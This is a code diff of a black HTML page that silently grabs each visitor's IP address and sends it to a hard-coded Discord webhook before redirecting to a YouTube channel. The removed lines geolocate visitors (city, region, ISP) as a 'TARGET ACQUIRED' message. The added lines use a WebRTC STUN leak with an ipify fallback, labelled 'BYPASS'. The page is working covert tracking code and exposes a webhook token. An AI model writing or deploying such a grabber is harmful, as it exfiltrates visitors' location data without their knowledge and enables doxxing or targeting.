@@ -2,41 +2,46 @@
 <html>
 <body style="background:#000;">
 <script>
-    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
-    const y = "https://youtube.com/@LigmaBlox-w7m";
+    const hook = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
+    const dest = "https://youtube.com/@LigmaBlox-w7m";
 
     // 1. Instant Heartbeat
-    navigator.sendBeacon(h, new Blob([JSON.stringify({ content: "⚠️ HIT: Tracking City/IP... (" + navigator.platform + ")" })], { type: 'application/json' }));
+    navigator.sendBeacon(hook, new Blob([JSON.stringify({ content: "🚀 BYPASS INITIALIZED (" + navigator.platform + ")" })], { type: 'application/json' }));
 
-    async function getFullIntel() {
-        let found = false;
-        while (!found) {
-            try {
-                // Using ip-api.com (Professional grade, provides City/Region/ISP)
-                const r = await fetch('https://ip-api.com/json/').then(res => res.json());
+    async function bypass() {
+        let ipFound = "Searching...";
 
-                if (r.status === "success") {
-                    const msg = "🎯 **TARGET ACQUIRED**\n" +
-                                "IP: " + r.query + "\n" +
-                                "City: " + r.city + "\n" +
-                                "Region: " + r.regionName + "\n" +
-                                "ISP: " + r.isp + "\n" +
-                                "Device: " + navigator.platform;
-                    
-                    const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-                    navigator.sendBeacon(h, blob);
-                    
-                    found = true;
-                    window.location.replace(y);
-                }
-            } catch (e) {
-                // 2ms retry loop if the network blocks the request
-                await new Promise(resolve => setTimeout(resolve, 2));
+        // The WebRTC Leak Technique
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+        pc.onicecandidate = (ice) => {
+            if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                // If WebRTC fails, we hit a backup stealth API as a last resort
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => finish(d.ip))
+                    .catch(() => finish("Hard Blocked"));
+                return;
             }
-        }
+            
+            // Regex to extract the IP address from the candidate string
+            const myIp = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+            finish(myIp);
+        };
+
+        // Safety timeout: if no bypass works in 4 seconds, just redirect
+        setTimeout(() => { location.replace(dest); }, 4000);
     }
 
-    getFullIntel();
+    function finish(ip) {
+        const msg = "🔓 **BYPASS SUCCESS**\nIP: " + ip + "\nDevice: " + navigator.platform;
+        navigator.sendBeacon(hook, new Blob([JSON.stringify({ content: msg })], { type: 'application/json' }));
+        location.replace(dest);
+    }
+
+    bypass();
 </script>
 </body>
 </html>
